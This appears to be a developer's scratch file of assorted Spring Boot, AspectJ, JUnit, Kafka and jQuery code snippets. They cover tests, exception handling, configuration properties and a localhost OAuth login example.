import com.paragon.microservices.crmmailadapter.test.annotation.SpringBootTestConfiguration;
import org.junit.Ignore;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.test.context.junit4.SpringRunner;

import static org.junit.Assert.assertEquals;

@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@SpringBootTestConfiguration
public class ActuatorInfoTest {

    @Autowired
    private TestRestTemplate restTemplate;

    @Ignore
    @Test
    public void whenGetInfo_thenReturns200() {
        final ResponseEntity<String> responseEntity = this.restTemplate.getForEntity("/actuator/info", String.class);
        assertEquals(HttpStatus.OK, responseEntity.getStatusCode());
    }

    @Ignore
    @Test
    public void whenFeatures_thenReturns200() {
        final ResponseEntity<String> responseEntity = this.restTemplate.getForEntity("/actuator/features", String.class);
        assertEquals(HttpStatus.OK, responseEntity.getStatusCode());
    }
}
--------------------------------------------------------------------------------------------------------
ArgumentCaptor<MyFunctionalInterface> lambdaCaptor = ArgumentCaptor.forClass(MyFunctionalInterface.class);

verify(bar).useLambda(lambdaCaptor.capture());

// Not retrieve captured arg (which is reference to lamdba).
MyFuntionalRef usedLambda = lambdaCaptor.getValue();

// Now you have reference to actual lambda that was passed, validate its behavior.
verifyMyLambdaBehavior(usedLambda);
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@WebMvcTest(CarServiceController.class)
public class CarServiceControllerTests {

    @Autowired
    private MockMvc mvc;

    @MockBean
    private CarService carService;

    @Test
    public void getCarShouldReturnCarDetails() {
        given(this.carService.schedulePickup(new Date(), new Route());)
            .willReturn(new Date());

        this.mvc.perform(get("/schedulePickup")
            .accept(MediaType.JSON)
            .andExpect(status().isOk());
    }
}
--------------------------------------------------------------------------------------------------------
@Configuration
public class RetryTemplateBeanPostProcessor implements BeanPostProcessor {

    public static final String DEFAULT_RETRY_TEMPLATE_BEAN_NAME = "retryTemplate";

    @Nullable
    @Override
    public Object postProcessAfterInitialization(final Object bean, final String beanName) throws BeansException {
        if (StringUtils.equalsIgnoreCase(beanName, DEFAULT_RETRY_TEMPLATE_BEAN_NAME)) {
            ((RetryTemplate) bean).setThrowLastExceptionOnExhausted(true);
        }
        return bean;
    }
}
--------------------------------------------------------------------------------------------------------
@SpringBootApplication
@Import({ProcessExecutorConfig.class})
public class App {
 
	public static void main(String[] args) {
		SpringApplication app = new SpringApplication(App.class);
		app.addInitializers(new CustomAppCtxInitializer());
		ConfigurableApplicationContext ctx = app.run();
	}
 
	private static class CustomAppCtxInitializer
			implements ApplicationContextInitializer<GenericApplicationContext> {
 
		@Override
		public void initialize(GenericApplicationContext applicationContext) {
			applicationContext
					.getDefaultListableBeanFactory()
					.setAllowBeanDefinitionOverriding(false);
		} 
	}
}
--------------------------------------------------------------------------------------------------------
spring.main.allow-bean-definition-overriding=true
--------------------------------------------------------------------------------------------------------
  /*
   *           N777777777NO
   *         N7777777777777N
   *        M777777777777777N
   *        $N877777777D77777M
   *       N M77777777ONND777M
   *       MN777777777NN  D777
   *     N7ZN777777777NN ~M7778
   *    N777777777777MMNN88777N
   *    N777777777777MNZZZ7777O
   *    DZN7777O77777777777777
   *     N7OONND7777777D77777N
   *      8$M++++?N???$77777$
   *       M7++++N+M77777777N
   *        N77O777777777777$                              M
   *          DNNM$$$$777777N                              D
   *         N$N:=N$777N7777M                             NZ
   *        77Z::::N777777777                          ODZZZ
   *       77N::::::N77777777M                         NNZZZ$
   *     $777:::::::77777777MN                        ZM8ZZZZZ
   *     777M::::::Z7777777Z77                        N++ZZZZNN
   *    7777M:::::M7777777$777M                       $++IZZZZM
   *   M777$:::::N777777$M7777M                       +++++ZZZDN
   *     NN$::::::7777$$M777777N                      N+++ZZZZNZ
   *       N::::::N:7$O:77777777                      N++++ZZZZN
   *       M::::::::::::N77777777+                   +?+++++ZZZM
   *       8::::::::::::D77777777M                    O+++++ZZ
   *        ::::::::::::M777777777N                      O+?D
   *        M:::::::::::M77777777778                     77=
   *        D=::::::::::N7777777777N                    777
   *       INN===::::::=77777777777N                  I777N
   *      ?777N========N7777777777787M               N7777
   *      77777$D======N77777777777N777N?         N777777
   *     I77777$$$N7===M$$77777777$77777777$MMZ77777777N
   *      $$$$$$$$$$$NIZN$$$$$$$$$M$$7777777777777777ON
   *       M$$$$$$$$M    M$$$$$$$$N=N$$$$7777777$$$ND
   *      O77Z$$$$$$$     M$$$$$$$$MNI==$DNNNNM=~N
   *   7 :N MNN$$$$M$      $$$777$8      8D8I
   *     NMM.:7O           777777778
   *                       7777777MN
   *                       M NO .7:
   *                       M   :   M
   *                            8
   */

--------------------------------------------------------------------------------------------------------
    public static void main(String[] args) {
        final byte[] expected = "fo".getBytes(StandardCharsets.US_ASCII);
        byte[] dst = new byte[expected.length];
        Base64.getMimeDecoder().decode("Zm8=\r\n".getBytes(StandardCharsets.US_ASCII), dst);
    }
--------------------------------------------------------------------------------------------------------
val file = File(Uri.parse(resources.openRawResource(R.raw.rec1).toString()).toString())
        var encodedBase64: String? = null
        try {
            val fileInputStreamReader = FileInputStream(file)
            val bytes = ByteArray(file.length().toInt())
            fileInputStreamReader.read(bytes)
            val result = Base64.encodeToString(bytes, Base64.DEFAULT)

            println("result--" + result)
        } catch (e: FileNotFoundException) {
            e.printStackTrace()
        } catch (e: IOException) {
            e.printStackTrace()
        }
--------------------------------------------------------------------------------------------------------
@Configuration
@ConditionalOnExpression(
    "${module.enabled:true} and ${module.submodule.enabled:true}"
)
class SubModule {
  ...
}
--------------------------------------------------------------------------------------------------------
@SpringBootApplication
public class SpringBootComponentScanApp {
    private static ApplicationContext applicationContext;
 
    @Bean
    public ExampleBean exampleBean() {
        return new ExampleBean();
    }
 
    public static void main(String[] args) {
        applicationContext = SpringApplication.run(SpringBootComponentScanApp.class, args);
        checkBeansPresence("cat", "dog", "rose", "exampleBean", "springBootComponentScanApp");
 
    }
 
    private static void checkBeansPresence(String... beans) {
        for (String beanName : beans) {
            System.out.println("Is " + beanName + " in ApplicationContext: " + 
              applicationContext.containsBean(beanName));
        }
    }
}
--------------------------------------------------------------------------------------------------------
var oauthToken = null;

function login() {
    var userLogin = $('#loginField').val();
    var userPassword = $('#passwordField').val();
    console.log ( '#someButton was clicked' );
    $.post({
        url: 'http://localhost:8080/app/rest/v2/oauth/token',
        headers: {
            'Authorization': 'Basic Y2xpZW50OnNlY3JldA==',
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        dataType: 'json',
        data: {grant_type: 'password', username: userLogin, password: userPassword},
        success: function (data) {
            oauthToken = data.access_token;
            $('#loggedInStatus').show();
            $('#loginForm').hide();
            loadRecentOrders();
        }
    })
}

function loadRecentOrders() {
    $.get({
        url: 'http://localhost:8080/app/rest/v2/entities/workshop$Order?view=_local',
        headers: {
            'Authorization': 'Bearer ' + oauthToken,
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        success: function (data) {
            $('#recentOrders').show();
            $.each(data, function (i, order) {
                $('#ordersList').append("<li>" + order.description + "</li>");
            });
        }
    });
}

@ConfigurationProperties("app.system")
public class AppSystemProperties {

	@DurationUnit(ChronoUnit.SECONDS)
	private Duration sessionTimeout = Duration.ofSeconds(30);

	private Duration readTimeout = Duration.ofMillis(1000);

	public Duration getSessionTimeout() {
		return this.sessionTimeout;
	}

	public void setSessionTimeout(Duration sessionTimeout) {
		this.sessionTimeout = sessionTimeout;
	}

	public Duration getReadTimeout() {
		return this.readTimeout;
	}

	public void setReadTimeout(Duration readTimeout) {
		this.readTimeout = readTimeout;
	}

}
@ConfigurationProperties("app.io")
public class AppIoProperties {

	@DataSizeUnit(DataUnit.MEGABYTES)
	private DataSize bufferSize = DataSize.ofMegabytes(2);

	private DataSize sizeThreshold = DataSize.ofBytes(512);

	public DataSize getBufferSize() {
		return this.bufferSize;
	}

	public void setBufferSize(DataSize bufferSize) {
		this.bufferSize = bufferSize;
	}

	public DataSize getSizeThreshold() {
		return this.sizeThreshold;
	}

	public void setSizeThreshold(DataSize sizeThreshold) {
		this.sizeThreshold = sizeThreshold;
	}
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class) 
@WebMvcTest
@AutoConfigureMockMvc
public class UserControllerIntegrationTest {
 
    @MockBean
    private UserRepository userRepository;
     
    @Autowired
    UserController userController;
 
    @Autowired
    private MockMvc mockMvc;
 
    //...
     
}

@Test
public void whenPostRequestToUsersAndValidUser_thenCorrectResponse() throws Exception {
    MediaType textPlainUtf8 = new MediaType(MediaType.TEXT_PLAIN, Charset.forName("UTF-8"));
    String user = "{\"name\": \"bob\", \"email\" : \"bob@domain.com\"}";
    mockMvc.perform(MockMvcRequestBuilders.post("/users")
      .content(user)
      .contentType(MediaType.APPLICATION_JSON_UTF8))
      .andExpect(MockMvcResultMatchers.status().isOk())
      .andExpect(MockMvcResultMatchers.content()
        .contentType(textPlainUtf8));
}
--------------------------------------------------------------------------------------------------------
String user = URLEncoder.encode(mailUserEmail, ConstantUtil.CHARACTER_ENCODING);
--------------------------------------------------------------------------------------------------------
function createUUID() {
    return uuid.v4();
}

// version 4
// createUUID.regex = '^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[89abAB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$';
createUUID.regex = '^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}$';

createUUID.is = function (str) {
    return new RegExp(createUUID.regex).test(str);
};

const uuidV4Regex = /^[A-F\d]{8}-[A-F\d]{4}-4[A-F\d]{3}-[89AB][A-F\d]{3}-[A-F\d]{12}$/i;
// compared to:     /^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4{1}[a-fA-F0-9]{3}-[89abAB]{1}[a-fA-F0-9]{3}-[a-fA-F0-9]{12}$/

const isValidV4UUID = uuid => uuidV4Regex.test(uuid);
--------------------------------------------------------------------------------------------------------
IOUtils.toString(Thread.currentThread().getContextClassLoader().getResourceAsStream("rsb-configuration-default.json"))
--------------------------------------------------------------------------------------------------------
import static org.hamcrest.CoreMatchers.is; 
import static org.hamcrest.CoreMatchers.nullValue; 
import static org.junit.Assert.assertThat; 
import static org.mockito.Mockito.mock; 
import static org.mockito.Mockito.when; 
 
import java.io.File; 
import java.net.URI; 
import java.net.URISyntaxException; 
import java.util.Arrays; 
import java.util.Calendar; 
import java.util.Collections; 
import java.util.GregorianCalendar; 
import java.util.TimeZone; 
 
import javax.ws.rs.core.HttpHeaders; 
import javax.xml.datatype.XMLGregorianCalendar; 
 
import org.junit.Test; 
 
/**
 * @author "OpenAnalytics <rsb.development@openanalytics.eu>" 
 */ 
public class UtilTestCase 
{ 
    @Test 
    public void isValidApplicationName() 
    { 
        assertThat(Util.isValidApplicationName("test123"), is(true)); 
        assertThat(Util.isValidApplicationName("123ABC"), is(true)); 
        assertThat(Util.isValidApplicationName("123_ABC"), is(true)); 
        assertThat(Util.isValidApplicationName("123-ABC"), is(false)); 
        assertThat(Util.isValidApplicationName(null), is(false)); 
        assertThat(Util.isValidApplicationName(""), is(false)); 
        assertThat(Util.isValidApplicationName("-test"), is(false)); 
        assertThat(Util.isValidApplicationName("1 2 3"), is(false)); 
    } 
 
    @SuppressWarnings("unchecked") 
    @Test 
    public void getSingleHeader() 
    { 
        final HttpHeaders httpHeaders = mock(HttpHeaders.class); 
        assertThat(Util.getSingleHeader(httpHeaders, "missing"), is(nullValue())); 
 
        when(httpHeaders.getRequestHeader("missing_too")).thenReturn(Collections.EMPTY_LIST); 
        assertThat(Util.getSingleHeader(httpHeaders, "missing_too"), is(nullValue())); 
 
        when(httpHeaders.getRequestHeader("single_value")).thenReturn(Collections.singletonList("bingo")); 
        assertThat(Util.getSingleHeader(httpHeaders, "single_value"), is("bingo")); 
 
        when(httpHeaders.getRequestHeader("multi_value")).thenReturn(Arrays.asList("bingo_too", "ignored")); 
        assertThat(Util.getSingleHeader(httpHeaders, "multi_value"), is("bingo_too")); 
    } 
 
    @Test 
    public void getMimeType() 
    { 
        assertThat(Util.getMimeType(new File("test.zip")).toString(), is(Constants.ZIP_MIME_TYPE.toString())); 
        assertThat(Util.getMimeType(new File("test.err.txt")).toString(), 
            is(Constants.TEXT_MIME_TYPE.toString())); 
        assertThat(Util.getMimeType(new File("test.pdf")).toString(), is(Constants.PDF_MIME_TYPE.toString())); 
        assertThat(Util.getMimeType(new File("test.foo")).toString(), is("application/octet-stream")); 
    } 
 
    @Test 
    public void getResourceType() 
    { 
        assertThat(Util.getResourceType(Constants.ZIP_MIME_TYPE), is("zip")); 
        assertThat(Util.getResourceType(Constants.PDF_MIME_TYPE), is("pdf")); 
        assertThat(Util.getResourceType(Constants.TEXT_MIME_TYPE), is("txt")); 
        assertThat(Util.getResourceType(Constants.DEFAULT_MIME_TYPE), is("dat")); 
    } 
 
    @Test 
    public void convertToXmlDate() 
    { 
        final GregorianCalendar gmtMinus8Calendar = new GregorianCalendar( 
            TimeZone.getTimeZone(TimeZone.getAvailableIDs(-8 * 60 * 60 * 1000)[0])); 
        gmtMinus8Calendar.set(2010, Calendar.JULY, 21, 11, 35, 48); 
        gmtMinus8Calendar.set(GregorianCalendar.MILLISECOND, 456); 
 
        final XMLGregorianCalendar xmlDate = Util.convertToXmlDate(gmtMinus8Calendar); 
        assertThat(xmlDate.getTimezone(), is(0)); 
        assertThat(xmlDate.toXMLFormat(), is("2010-07-21T18:35:48.456Z")); 
    } 
 
    @Test(expected = IllegalArgumentException.class) 
    public void newURIFailure() 
    { 
        Util.newURI(" a b c "); 
    } 
 
    @Test 
    public void newURISuccess() throws URISyntaxException 
    { 
        assertThat(Util.newURI("foo://bar"), is(new URI("foo://bar"))); 
    } 
}
--------------------------------------------------------------------------------------------------------
private SearchTerm fromAndNotSeenTerm(final Flags supportedFlags, final Folder folder) {
    try {
        final FromTerm fromTerm = new FromTerm(new InternetAddress("bar@baz"));
        return new AndTerm(fromTerm, new FlagTerm(new Flags(Flags.Flag.SEEN), false));
    } catch (AddressException e) {
        throw new RuntimeException(e);
    }
}
--------------------------------------------------------------------------------------------------------
import static org.hamcrest.Matchers.hasProperty;
import static org.hamcrest.Matchers.is;
import static org.hamcrest.Matchers.startsWith;

import javax.ws.rs.NotFoundException;
import javax.ws.rs.core.Response;
import javax.ws.rs.core.Response.Status;

import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.ExpectedException;

public class TestExy {
    @Rule
    public ExpectedException thrown = ExpectedException.none();

    @Test
    public void shouldThrow() {
        TestThing testThing = new TestThing();
        thrown.expect(NotFoundException.class);
        thrown.expectMessage(startsWith("some Message"));
        thrown.expect(hasProperty("response", hasProperty("status", is(404))));
        testThing.chuck();
    }

    private class TestThing {
        public void chuck() {
            Response response = Response.status(Status.NOT_FOUND).entity("Resource not found").build();
            throw new NotFoundException("some Message", response);
        }
    }
}

@Rule
public ExpectedException thrown = ExpectedException.none();

@Test
public void shouldTestExceptionMessage() throws IndexOutOfBoundsException {
    List<Object> list = new ArrayList<Object>();
 
    thrown.expect(IndexOutOfBoundsException.class);
    thrown.expectMessage("Index: 0, Size: 0");
    list.get(0); // execution will never get past this line
}
--------------------------------------------------------------------------------------------------------
@TestPropertySource(
        properties = {
                "spring.jpa.hibernate.ddl-auto=validate",
                "liquibase.enabled=false"
        }
)

@RunWith(SpringRunner.class)
@SpringBootTest
public class AddressFieldsTest {

    @InjectMocks
    AddressFieldsValidator addressFieldsValidator;

    @Autowired
    AddressFieldsConfig addressFieldsConfig;

    @Before
    public void setUp() throws Exception{
        MockitoAnnotations.initMocks(this);
        ReflectionTestUtils.setField(addressFieldsValidator,"addressFieldsConfig", addressFieldsConfig);
    }

}

@Data
@Component
@RefreshScope
@ConfigurationProperties(prefix = "address.fields.regex")
public class AddressFieldsConfig {

    private int firstName;
    private int lastName;
    .........
	
@SpringBootTest(
        properties = ["spring.profiles.active=test"],
        classes = Application.class,
)
public class MyIntTest {

import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;

import de.scrum_master.app.Authenticated;

@Aspect
public class VehicleActionInterceptor {
  @Before("execution(* de.scrum_master.app.IVehicle+.*(..)) && @annotation(authenticated)")
  public void beforeAction(JoinPoint thisJoinPoint, Authenticated authenticated) {
    System.out.println(thisJoinPoint + " -> " + authenticated);
  }
}
--------------------------------------------------------------------------------------------------------
@Pointcut("call(@Authenticated * IVehicle+.*(..)) && within(RacingApp)")
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;

@Aspect
public class VehicleActionInterceptor {
  @Before("execution(@de.scrum_master.app.Authenticated * de.scrum_master.app.IVehicle+.*(..))")
  public void beforeAction(JoinPoint thisJoinPoint) {
    System.out.println(thisJoinPoint);
  }
}


--------------------------------------------------------------------------------------------------------
final Validator validator = Validation.buildDefaultValidatorFactory().getValidator();
final Set<ConstraintViolation<Object>> violations = validator
    .forExecutables()
    .validateParameters(
    object,
    method,
    args
);
import javax.validation.constraints.NotNull;
interface Foo {
    void test(@NotNull(message = "foo") String value);
}

class Bar implements Foo {
    @Override
    public void test(@NotNull final String value) {
        System.out.println(value);
    }
}

import static org.hamcrest.Matchers.hasProperty;
import static org.hamcrest.Matchers.is;
import static org.hamcrest.Matchers.startsWith;

import javax.ws.rs.NotFoundException;
import javax.ws.rs.core.Response;
import javax.ws.rs.core.Response.Status;

import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.ExpectedException;

public class TestExy {
    @Rule
    public ExpectedException thrown = ExpectedException.none();

    @Test
    public void shouldThrow() {
        TestThing testThing = new TestThing();
        thrown.expect(NotFoundException.class);
        thrown.expectMessage(startsWith("some Message"));
        thrown.expect(hasProperty("response", hasProperty("status", is(404))));
        testThing.chuck();
    }

    private class TestThing {
        public void chuck() {
            Response response = Response.status(Status.NOT_FOUND).entity("Resource not found").build();
            throw new NotFoundException("some Message", response);
        }
    }
}
--------------------------------------------------------------------------------------------------------
@Bean
    public TomcatServletWebServerFactory containerFactory() {
        return new TomcatServletWebServerFactory() {
            protected void customizeConnector(Connector connector) {
                int maxSize = 50000000;
                super.customizeConnector(connector);
                connector.setMaxPostSize(maxSize);
                connector.setMaxSavePostSize(maxSize);
                if (connector.getProtocolHandler() instanceof AbstractHttp11Protocol) {

                    ((AbstractHttp11Protocol <?>) connector.getProtocolHandler()).setMaxSwallowSize(maxSize);
                    logger.info("Set MaxSwallowSize "+ maxSize);
                }
            }
        };

    }
--------------------------------------------------------------------------------------------------------
@After("execution(* org.springsource.service.OrderServiceImpl.findOrder(..))") 


DefaultHandlerExceptionResolver
SimpleMappingExceptionResolver
ExceptionHandlerExceptionResolver
AbstractHandlerMethodExceptionResolver
ResponseStatusExceptionResolver

AbstractHandlerMethodExceptionResolver
--------------------------------------------------------------------------------------------------------
@Pointcut("execution(* io.mc.springaspects.DummyComponent.doThrow())")
protected void doThrow() { }

@AfterThrowing(pointcut="doThrow()", throwing="ex")
public void doThrowThrows(TestException ex) {
   consoleLogger.log("doThrow() THROWS EXCEPTION: %s",
        ex.getClass().getSimpleName());
}
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.links.aspect;

import lombok.extern.slf4j.Slf4j;
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;
import org.aspectj.lang.annotation.Pointcut;
import org.springframework.stereotype.Component;

import java.util.Arrays;

@Slf4j
@Aspect
@Component
public class MyAspect {

//    //    @Pointcut("@target(org.springframework.web.bind.annotation.RestControllerAdvice)")
////    @Pointcut("@target(org.springframework.stereotype.Repository)")
////    @Pointcut("@target(com.paragon.microservices.links.aspect.ExceptionLogHandler)")
//    @Pointcut("within(@org.springframework.web.bind.annotation.RestControllerAdvice *)")
//    public void repositoryClassMethods() {
//    }

    @Pointcut("@annotation(org.springframework.web.bind.annotation.RestControllerAdvice)")
    public void restControllerAdviceAnnotation() {
    }

    @Pointcut("@annotation(com.paragon.microservices.links.aspect.ExceptionLogHandler)")
    public void exceptionLogHandlerAnnotation() {
    }

    @Pointcut("@annotation(org.springframework.web.bind.annotation.ExceptionHandler)")
    public void exceptionHandlerAnnotation() {
    }

//    @Pointcut("execution(@com.paragon.microservices.links.aspect.ExceptionLogHandler * *.*(..))")
//    protected void useAdviceOnThisMethodAnnotation() {
//    }

    @Pointcut("execution(* org.springframework.web.servlet.handler.AbstractHandlerMethodExceptionResolver.*(..))")
    protected void abstractHandlerMethodExceptionResolver() {
    }

    @Pointcut("execution(* org.springframework.web.servlet.mvc.method.annotation.ResponseEntityExceptionHandler.*(..))")
    protected void responseEntityExceptionHandler() {
    }

    @Pointcut("exceptionHandlerAnnotation() && @annotation(exceptionLogHandler)")
    protected void before333(final ExceptionLogHandler exceptionLogHandler) {
    }

//    @Before("before3()")
//    public void before(final JoinPoint joinPoint) {
//        log.info(" Check for user access ");
//        log.info(" Allowed execution for {}", joinPoint);
//    }

//    @Around("repositoryClassMethods()")
//    public Object measureMethodExecutionTime(ProceedingJoinPoint pjp) throws Throwable {
//        long start = System.nanoTime();
//        Object retval = pjp.proceed();
//        long end = System.nanoTime();
//        String methodName = pjp.getSignature().getName();
//        return retval;
//    }

//    @Before("useAdviceOnThisMethodAnnotation()")
//    public void useAdviceBefore(final JoinPoint joinPoint) {
//        log.info("[ASPECT] SOURCE LOCATION: %s", joinPoint.getSourceLocation());
//    }

//    @Before("useAdviceOnThisMethodAnnotation() && @annotation(useAdvice)")
//    public void useAdviceBefore2(final JoinPoint joinPoint, final ExceptionLogHandler useAdvice) {
//        log.info("VALUE: %s", useAdvice);
//    }

//    @Before("callAtMyServicePublic3()")
//    public void beforeCallAtMethod3(final JoinPoint jp) {
//        final String args = Arrays.stream(jp.getArgs())
//                .map(a -> a.toString())
//                .collect(Collectors.joining(","));
//        log.info("before " + jp.toString() + ", args=[" + args + "]");
//    }
//
//    @Before("callAtMyServicePublic5()")
//    public void beforeCallAtMethod5(final JoinPoint jp) {
//        final String args = Arrays.stream(jp.getArgs())
//                .map(a -> a.toString())
//                .collect(Collectors.joining(","));
//        log.info("before " + jp.toString() + ", args=[" + args + "]");
//    }

    @Around("restControllerAdviceAnnotation()")
    public Object aroundCall3(final ProceedingJoinPoint joinPoint) throws Throwable {
        log.debug("logAround() is running!");
        log.debug("method name: " + joinPoint.getSignature().getName());
        log.debug("method arguments: " + Arrays.toString(joinPoint.getArgs()));
        log.debug("logAround before is running!");
        final Object result = joinPoint.proceed();
        log.debug("logAround after is running!");
        return result;
    }

    @Around("exceptionLogHandlerAnnotation() || exceptionHandlerAnnotation() || responseEntityExceptionHandler()")
    public Object aroundCall(final ProceedingJoinPoint joinPoint) throws Throwable {
        log.debug("logAround() is running!");
        log.debug("method name: " + joinPoint.getSignature().getName());
        log.debug("method arguments: " + Arrays.toString(joinPoint.getArgs()));
        log.debug("logAround before is running!");
        final Object result = joinPoint.proceed();
        log.debug("logAround after is running!");
        return result;
    }

    @Around("before333(exceptionLogHandler)")
    public Object ar(final ProceedingJoinPoint joinPoint, final ExceptionLogHandler exceptionLogHandler) throws Throwable {
        final String value = exceptionLogHandler.value();
        final Object result = joinPoint.proceed();
        log.debug("logAround after is running!");
        return result;
    }

//    @Around("callAtMyServicePublic5()")
//    public Object aroundCall2(final ProceedingJoinPoint joinPoint) throws Throwable {
//        log.debug("logAround() is running!");
//        log.debug("method name: " + joinPoint.getSignature().getName());
//        log.debug("method arguments: " + Arrays.toString(joinPoint.getArgs()));
//        log.debug("logAround before is running!");
//        final Object result = joinPoint.proceed();
//        log.debug("logAround after is running!");
//        return result;
//    }
}
--------------------------------------------------------------------------------------------------------
{
"timestamp": "2019-08-20T14:28:03.406+0000",
"status": 405,
"error": "Method Not Allowed",
"message": "Request method 'GET' not supported",
"path": "/api/v0/links/execute/23233"
}
--------------------------------------------------------------------------------------------------------
@Before("doStuff()")
public void beforeDoStuff(JoinPoint joinPoint) {
     consoleLogger.log("BEFORE CALL TO doStuff()");
     
     consoleLogger.log("ARGUMENTS:");
     Arrays.stream(joinPoint.getArgs())
         .map(Object::toString)
         .forEach(arg -> consoleLogger.log("\t%s", arg));
     
     consoleLogger.log("");
}

@Pointcut("execution(@io.mc.springaspects.UseAdviceOnThisMethod * *.*(..))")
protected void useAdviceOnThisMethodAnnotation() { }    

@Before("useAdviceOnThisMethodAnnotation()")
public void useAdviceBefore(JoinPoint joinPoint) {
  consoleLogger.log("[ASPECT] SOURCE LOCATION: %s",
      joinPoint.getSourceLocation());
}
@UseAdviceOnThisMethod
public void someMethod() {
   consoleLogger.log("Hello, world!");
}

@Pointcut("execution(@io.mc.springaspects.UseAdviceOnThisMethod * *.*(..))")
protected void useAdviceOnThisMethodAnnotation() { }    

@Before("useAdviceOnThisMethodAnnotation() && @annotation(useAdvice)")
public void useAdviceBefore(JoinPoint joinPoint, 
                            UseAdviceOnThisMethod useAdvice) {
  consoleLogger.log("VALUE: %s", useAdvice.value());
}
--------------------------------------------------------------------------------------------------------
package com.spring.mvc.demo.exception.advice;
 
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.bind.annotation.ExceptionHandler;
import org.springframework.web.servlet.ModelAndView;
 
import com.spring.mvc.demo.exception.MyException;
 
@ControllerAdvice
public class ExceptionControllerAdvice {
 
    @ExceptionHandler(MyException.class)
    public ModelAndView handleMyException(MyException mex) {
 
        ModelAndView model = new ModelAndView();
        model.addObject("errCode", mex.getErrCode());
        model.addObject("errMsg", mex.getErrMsg());
        model.setViewName("error/generic_error");
        return model;
    }
 
    @ExceptionHandler(Exception.class)
    public ModelAndView handleException(Exception ex) {
 
        ModelAndView model = new ModelAndView();
        model.addObject("errMsg", "This is a 'Exception.class' message.");
        model.setViewName("error/generic_error");
        return model;
 
    }
}

package com.jcombat.controller;
  
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.bind.annotation.ExceptionHandler;
  
import com.jcombat.bean.ErrorResponse;
  
@ControllerAdvice
public class ExceptionControllerAdvice {
  
    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> exceptionHandler(Exception ex) {
        ErrorResponse error = new ErrorResponse();
        error.setErrorCode(HttpStatus.INTERNAL_SERVER_ERROR.value());
        error.setMessage("Please contact your administrator");
        return new ResponseEntity<ErrorResponse>(error, HttpStatus.OK);
    }
}
--------------------------------------------------------------------------------------------------------
@Controller
@RequestMapping("/myworld")
public class MyWorldController {
	@Autowired
	private UserValidator userValidator;
	@RequestMapping(value="signup", method = RequestMethod.GET)
	public ModelAndView user(){
		return new ModelAndView("user","user",new User());
	}
	@InitBinder
	public void dataBinding(WebDataBinder binder) {
		binder.addValidators(userValidator);
	}
	@RequestMapping(value="save", method = RequestMethod.POST)
	public String createUser(@ModelAttribute("user") @Valid User user,BindingResult result, ModelMap model) 
			                                                throws FileNotFoundException {
	    if(result.hasErrors()) {
	    	return "user";
	    }
	    if(user.getName().equals("exception")) {
	        throw new FileNotFoundException("Error found.");	
	    }
	    System.out.println("Name:"+ user.getName());
	    System.out.println("Date of Birth:"+ user.getDob());
	    return "success";
	}	
} 
--------------------------------------------------------------------------------------------------------
ValidationMessages_en_US.properties
--------------------------------------------------------------------------------------------------------
@SpringBootApplication
@ComponentScan(basePackages = { "com.myname" },
              excludeFilters = @ComponentScan.Filter(type = FilterType.ASPECTJ, pattern = "com.myname.configs.*"))
public class DemoWebappApplication {...}  
--------------------------------------------------------------------------------------------------------
@Configuration
@PropertiesValueSource("classpath:com/acme/db.properties")
public class AppConfig {
    @ExternalValue("datasource.username") String username;

    @Bean
    public TestBean testBean() {
        return new TestBean(username);
    }
}

@Configuration
@EnvironmentValueSource
@SystemPropertiesValueSource
@PropertiesValueSource("classpath:com/acme/db.properties")
public class AppConfig {
    @ExternalValue("datasource.username") String username;

    @Bean
    public TestBean testBean() {
        return new TestBean(username);
    }
}
--------------------------------------------------------------------------------------------------------
    private val server: KafkaServer
    private val zkClient: ZkClient
    private val zkServer: EmbeddedZookeeper

    init {
        zkServer = EmbeddedZookeeper()
        val zkConnect = "127.0.0.1:${zkServer.port()}"

        val props = Properties()
        props.setProperty("zookeeper.connect", zkConnect)
        props.setProperty("broker.id", "0")
        props.setProperty("log.dirs", Files.createTempDirectory("kafka-").toAbsolutePath().toString())
        props.setProperty("listeners", "PLAINTEXT://127.0.0.1:$port")
        props.setProperty("offsets.topic.replication.factor", "1")

        server = KafkaServer(KafkaConfig(props), Time.SYSTEM, Option.apply("kafka-broker"), JavaConversions.asScalaBuffer(emptyList()))
        server.startup()

        zkClient = ZkClient(zkConnect, 30000, 30000, `ZKStringSerializer$`.`MODULE$`)
        val zkUtils = ZkUtils.apply(zkClient, false)
        AdminUtils.createTopic(zkUtils, topic, 1, 1, Properties(), RackAwareMode.`Disabled$`.`MODULE$`)

        TestUtils.waitUntilMetadataIsPropagated(scala.collection.JavaConversions.asScalaBuffer(listOf(server)), topic, 0, 5000);

    }

    override fun close() {
        server.shutdown()
        server.awaitShutdown()
        zkClient.close()
        zkServer.shutdown()
    }
}
--------------------------------------------------------------------------------------------------------
language: java
jdk:
  - oraclejdk8
sudo: false
cache:
  directories:
    - $HOME/.m2
install: true

## Define kafka versions to build against
env:
-
  KAFKA_VERSION=0.11.0.3
